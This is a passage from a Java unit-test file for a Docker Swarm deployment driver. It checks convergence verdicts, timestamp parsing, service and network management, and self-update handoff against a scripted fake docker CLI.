    // The daemon stamps StartedAt after the CLI returned, so only a clock disagreement can make
    // this deployment's own status look earlier than its issue instant. Five seconds is above any
    // such skew and far below the distance to the previous cutover.
    SwarmDeploymentDriver inside = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(5)) + "|done"));

    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        inside.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome());

    SwarmDeploymentDriver outside = driverThatIssuedAnUpdate();
    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(6)) + "|done"));

    DeploymentDriver.Convergence stale =
        outside.awaitConverged("dev-qits-gateway", Duration.ZERO);
    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, stale.outcome());
    assertTrue(stale.detail().contains("earlier update"), stale.detail());
  }

  @Test
  void aStampThisCannotReadIsPendingRatherThanAVerdictOrACrash() {
    // Docker's wording is not an API. An unreadable stamp cannot be matched, so it cannot be
    // believed — and the raw text goes into the timeout, which is what makes the next one findable.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "completed|<nil>|update completed"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO);

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("<nil>"), converged.detail());
  }

  @Test
  void bothOfDockersTimestampSpellingsAreReadAndNothingElseIs() {
    // Measured on docker 29.7.2: `service inspect --format` prints Go's own time.Time.String(),
    // while the JSON body of the same inspect says RFC3339. Both are docker's, so both parse.
    Instant expected = Instant.parse("2026-08-13T10:21:12.655795838Z");
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13 10:21:12.655795838 +0000 UTC"));
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13T10:21:12.655795838Z"));
    assertEquals(
        expected, SwarmDeploymentDriver.parseStartedAt("2026-08-13 12:21:12.655795838 +0200 CEST"));
    assertNull(SwarmDeploymentDriver.parseStartedAt("<nil>"));
    assertNull(SwarmDeploymentDriver.parseStartedAt("<no value>"));
    assertNull(SwarmDeploymentDriver.parseStartedAt(""));
    assertNull(SwarmDeploymentDriver.parseStartedAt(null));
  }

  @Test
  void theInFlightUpdateDoesNotOutliveItsVerdict() {
    // The issue instant is state carried between two calls on one bean, so it has to be consumed
    // by the answer: a deployment that kept it would make the NEXT question about this service
    // wait for an update nobody issued.
    SwarmDeploymentDriver driver = driverThatIssuedAnUpdate();
    cli.script(".UpdateStatus", result(0, "completed|" + stamp(ISSUED) + "|update completed"));

    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome());

    cli.script(
        ".UpdateStatus", result(0, "completed|" + stamp(ISSUED.minusSeconds(3600)) + "|done"));
    assertEquals(
        DeploymentDriver.ConvergenceOutcome.CONVERGED,
        driver.awaitConverged("dev-qits-gateway", Duration.ZERO).outcome(),
        "nothing is in flight now, so the field is read the way the sweep reads it");
  }

  @Test
  void aFreshlyCreatedServiceHasNoUpdateStatusAndIsJudgedByItsTask() {
    // The first deployment of an application is a `service create`, and swarm records an update
    // status only from the first update onward. A task is Running only once its healthcheck passed,
    // which is the same statement the missing field would have made — and, unlike an update, there
    // is no predecessor whose task could answer instead.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(1, "no such service"));
    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, driver.apply(spec()).outcome());
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script(
        "service ps",
        result(0, "Starting less than a second ago"),
        result(0, "Running 2 seconds ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.CONVERGED, converged.outcome());
  }

  @Test
  void aFirstDeploymentWhoseTaskDiesIsAFailedDeployment() {
    SwarmDeploymentDriver driver = driver();
    cli.script(".UpdateStatus", result(0, "||"));
    cli.script("service ps", result(0, "Failed 1 second ago"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(2));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("no task"), converged.detail());
  }

  @Test
  void aServiceSwarmDoesNotHaveEndsTheWaitAtOnce() {
    SwarmDeploymentDriver driver = driver();
    cli.script(".UpdateStatus", result(1, "Error: no such service: dev-qits-gateway"));

    DeploymentDriver.Convergence converged =
        driver.awaitConverged("dev-qits-gateway", Duration.ofSeconds(30));

    assertEquals(DeploymentDriver.ConvergenceOutcome.FAILED, converged.outcome());
    assertTrue(converged.detail().contains("no service"), converged.detail());
  }

  @Test
  void observationSpeaksTheGatesVocabulary() {
    // The observer settles rows on HealthGate.healthy, so a swarm task state has to arrive in the
    // same spelling a docker inspect does. Starting is PENDING, exactly as restarting is.
    SwarmDeploymentDriver driver = driver();
    cli.script("service ps", result(0, "Running 4 minutes ago"));
    assertTrue(HealthGate.healthy(driver.observe("dev-qits-gateway")));

    driver = driver();
    cli.script("service ps", result(0, "Starting less than a second ago"));
    assertEquals("starting/unhealthy", driver.observe("dev-qits-gateway").state());

    driver = driver();
    cli.script("service ps", result(0, "Shutdown 3 minutes ago"));
    assertEquals("exited/unhealthy", driver.observe("dev-qits-gateway").state());

    driver = driver();
    cli.script("service ps", result(1, "Error: no such service: dev-qits-gateway"));
    assertEquals(
        "Error: no such service: dev-qits-gateway",
        driver.observe("dev-qits-gateway").gone(),
        "a service swarm does not have is gone, which is a structural fact");
  }

  @Test
  void observationFallsBackToTheStackNamedService() {
    // The deployer's self-update keeps its seed-stack service, and the observer must read it
    // there: asking only the bare alias flipped a healthy self-updated deployer to FAILED on two
    // "no such service" passes.
    SwarmDeploymentDriver driver = driver();
    cli.script("service ps dev-qits-gateway", result(1, "Error: no such service: dev-qits-gateway"));
    cli.script("service ps qits_dev-qits-gateway", result(0, "Running 4 minutes ago"));

    assertTrue(HealthGate.healthy(driver.observe("dev-qits-gateway")));
  }

  @Test
  void anOverlayIsAttachableSoPlainContainersKeepWorkingOnIt() {
    List<String> argv =
        driver()
            .buildNetworkCreateArgv(
                new DeploymentDriver.Network(
                    "qits-net", null, DeploymentDriver.NetworkKind.BUNDLE, null));

    assertEquals(
        List.of("docker", "network", "create", "-d", "overlay", "--attachable"),
        argv.subList(0, 6));
    assertTrue(argv.contains("qits.platform.deployments.network=bundle"));
    assertEquals("qits-net", argv.get(argv.size() - 1));
  }

  @Test
  void onlyTheCollapsedNetworksAreEverMade() {
    // The caller asks for a per-application network on every deployment, because it is the same
    // state machine. Making one would be an overlay no service is ever on.
    SwarmDeploymentDriver driver = driver();

    assertFalse(
        driver.ensureNetwork(
            new DeploymentDriver.Network(
                "qits-env-dev-qits-gateway",
                "env-id",
                DeploymentDriver.NetworkKind.APPLICATION,
                "qits-gateway")));
    assertTrue(cli.calls.isEmpty(), "not even a lookup: " + cli.calls);
  }

  @Test
  void aNetworkIsRemovableASecondAfterItsServicesGoSoTheRemovalRetries() {
    // Measured: the tasks' endpoints outlive the `service rm` that ordered them away, so a single
    // attempt reports a failure that is only early.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        "network rm",
        result(1, "Error response from daemon: network qits-env-dev has active endpoints"),
        result(1, "Error response from daemon: network qits-env-dev has active endpoints"),
        result(0, "qits-env-dev"));

    driver.removeNetwork("qits-env-dev");

    assertEquals(3, cli.count("network rm"), "it kept trying: " + cli.calls);
  }

  @Test
  void aNetworkNobodyHasIsNotRetriedAtAll() {
    SwarmDeploymentDriver driver = driver();
    cli.script("network rm", result(1, "Error: No such network: qits-env-gone"));

    driver.removeNetwork("qits-env-gone");

    assertEquals(1, cli.count("network rm"));
  }

  @Test
  void anEnvironmentTeardownRemovesItsServicesByLabel() {
    SwarmDeploymentDriver driver = driver();
    cli.script("service ls", result(0, "svc-a\nsvc-b\n"));

    assertEquals(2, driver.removeEnvironmentContainers("env-id"));

    List<String> listed = cli.matching("service ls");
    assertTrue(
        listed.contains("label=qits.platform.deployments.environment=env-id"), listed.toString());
    assertEquals(
        List.of("docker", "service", "rm", "svc-a", "svc-b"), cli.matching("service rm"));
  }

  @Test
  void aSelfUpdateIsHandedToTheManagerRatherThanAwaited() {
    // Swarm arbitrates a succession no process can arbitrate for itself: the manager lives in the
    // daemon, so it can stop this task, start the successor and revert the spec if the successor
    // never goes healthy. Nothing here waits for that — this process is what is being replaced.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("this-task-container");
    cli.script("--format {{.ID}}", result(0, "svc123"));
    // Swarm labels every task container with the service it belongs to; this task's says the
    // service being deployed is the one this process runs as.
    cli.script("Config.Labels", result(0, "dev-qits-gateway"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    assertFalse(cli.matching("service update").isEmpty(), "the update was still issued");
  }

  @Test
  void aSelfStillRunningAsTheSeedStackServiceUpdatesThatServiceInPlace() {
    // The bootstrap starts the deployer as the seed stack's service, so its own label is the
    // stack-prefixed name. The self-update must target THAT service — a bare-named sibling would
    // be a second deployer on the same registry — and the seed twin is never reaped: it is self.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("this-task-container");
    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("Config.Labels", result(0, "qits_dev-qits-gateway"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.HANDED_OFF, applied.outcome());
    List<String> update = cli.matching("service update");
    assertEquals(
        "qits_dev-qits-gateway", update.get(update.size() - 1), "the stack-named service is the target");
    assertTrue(cli.matching("service rm").isEmpty(), "its own seed service is not reaped");
  }

  @Test
  void theSeedTwinIsRemovedBeforeTheSuccessorTakesItsAliasAndPorts() {
    // First pipeline deploy of an application the seed stack still serves: the twin holds the
    // wire alias (DNS would round-robin between the two) and any host-mode ports (the successor
    // would sit Pending on them forever), so it goes first.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(1, "no such service"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(0, "twin123"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
    assertEquals(
        List.of("docker", "service", "rm", "qits_dev-qits-gateway"), cli.matching("service rm"));
    assertFalse(cli.matching("service create").isEmpty(), "the successor is still created");
    int rmAt = cli.calls.indexOf(List.of("docker", "service", "rm", "qits_dev-qits-gateway"));
    int createAt =
        cli.calls.indexOf(cli.matching("service create"));
    assertTrue(rmAt < createAt, "the twin goes before the successor is created");
  }

  @Test
  void theRunningImageIsReadWithSwarmsUpdateStatusBesideIt() {
    // The startup sweep's evidence, in one inspect: what the service runs, and swarm's account of
    // the update that put it there. The image is the verdict — UpdateStatus holds the most recent
    // update alone, so a later deployment overwrites what it said about this row.
    SwarmDeploymentDriver driver = driver();
    cli.script(
        "Spec.TaskTemplate.ContainerSpec.Image",
        result(0, IMAGE + "|rollback_completed|" + stamp(ISSUED) + "|rollback completed\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertEquals("rollback_completed: rollback completed", running.detail());
    List<String> argv = cli.matching("service inspect");
    assertEquals(
        List.of(
            "docker",
            "service",
            "inspect",
            "--format",
            SwarmDeploymentDriver.RUNNING_IMAGE_FORMAT,
            "dev-qits-gateway"),
        argv);
  }

  @Test
  void theRunningImageFallsBackToTheStackNamedService() {
    // The deployer's own self-update targets the stack-named service it runs as, so the
    // successor's startup sweep reads its evidence there too — asking only the bare alias
    // settled a succeeded self-update as "interrupted".
    SwarmDeploymentDriver driver = driver();
    cli.script("{{end}} dev-qits-gateway", result(1, "Error: no such service: dev-qits-gateway"));
    cli.script(
        "{{end}} qits_dev-qits-gateway",
        result(0, IMAGE + "|completed|" + stamp(ISSUED) + "|update completed\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertEquals("completed: update completed", running.detail());
  }

  @Test
  void aServiceSwarmDoesNotHaveIsNoEvidenceAtAll() {
    // "No such service" is not a rollback and not a success; the sweep fails the row as interrupted
    // rather than reading a verdict out of an error message.
    SwarmDeploymentDriver driver = driver();
    cli.script("service inspect", result(1, "Error: no such service: dev-qits-gone"));

    assertTrue(driver.runningImage("dev-qits-gone").isEmpty());
  }

  @Test
  void aServiceNothingHasUpdatedYetCarriesItsImageAndNoWords() {
    SwarmDeploymentDriver driver = driver();
    cli.script("Spec.TaskTemplate.ContainerSpec.Image", result(0, IMAGE + "|||\n"));

    DeploymentDriver.RunningImage running = driver.runningImage("dev-qits-gateway").orElseThrow();

    assertEquals(IMAGE, running.imageRef());
    assertNull(running.detail(), "a service created and never updated has no UpdateStatus");
  }

  @Test
  void aRefusedUpdateIsARefusedDeploymentWithSwarmsWords() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("service update", result(1, "Error response from daemon: rpc error"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains("rpc error"), applied.detail());
  }

  // --- the scripted seam --------------------------------------------------------------------

  /** A container id file of this test's own, so nothing here depends on the build host. */
  private static Path hostnameFile(String id) {
    try {
      Path file = Files.createTempFile("qits-swarm-hostname", "");
      file.toFile().deleteOnExit();
      Files.writeString(file, id + "\n");
      return file;
    } catch (IOException e) {
      throw new IllegalStateException(e);
    }
  }

  private static PdProcess.Result result(int exitCode, String output) {
    return new PdProcess.Result(exitCode, output, false, false);
  }

  /**
   * The docker CLI, scripted by a substring of the argv. Answers are consumed in order and the last
   * one repeats, which is what makes a polling test a list of readings rather than a state machine.
   */
  private static final class ScriptedCli implements SwarmDeploymentDriver.Cli {

    final List<List<String>> calls = Collections.synchronizedList(new ArrayList<>());
    private final Map<String, Deque<PdProcess.Result>> scripted = new LinkedHashMap<>();

    void script(String argvContains, PdProcess.Result... answers) {
      scripted.put(argvContains, new ArrayDeque<>(List.of(answers)));
    }

    @Override
    public PdProcess.Result run(List<String> argv, Duration timeout) {
      calls.add(List.copyOf(argv));
      String joined = String.join(" ", argv);
      for (Map.Entry<String, Deque<PdProcess.Result>> entry : scripted.entrySet()) {
        if (joined.contains(entry.getKey())) {
          Deque<PdProcess.Result> answers = entry.getValue();
          return answers.size() == 1 ? answers.peek() : answers.poll();
        }
      }
      return result(0, "");
    }

    /** The one call whose argv contains this, failing loudly when there is none. */
    List<String> matching(String argvContains) {
      return calls.stream()
          .filter(argv -> String.join(" ", argv).contains(argvContains))
          .findFirst()
          .orElse(List.of());
    }

    int count(String argvContains) {
      return (int)
          calls.stream().filter(argv -> String.join(" ", argv).contains(argvContains)).count();
    }
  }
}
